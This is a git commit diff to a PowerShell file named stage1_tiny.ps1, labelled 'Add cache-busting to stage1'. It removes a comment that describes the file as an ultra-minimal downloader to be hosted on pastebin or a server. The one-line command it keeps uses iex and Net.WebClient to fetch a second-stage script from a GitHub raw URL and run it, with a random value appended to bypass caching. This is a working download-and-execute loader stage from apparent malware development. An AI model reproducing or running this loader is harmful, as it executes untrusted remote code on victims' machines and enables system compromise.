1736b75c786bde1c54a1c2733493da201eee0887
7777 <a@7777s-Mac-mini.local>
2026-06-28 02:48:14 +0800

    Add cache-busting to stage1

--- stage1_tiny.ps1
+++ stage1_tiny.ps1
@@ -1,2 +1,1 @@
-# Stage 1: Ultra-minimal downloader (host this on pastebin/your server)
-iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/taxesmmmm-collab/tsetinyourmymmas-ass/main/stage2_full.ps1')
+iex(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/taxesmmmm-collab/tsetinyourmymmas-ass/main/stage2_full.ps1?$(Get-Random)")
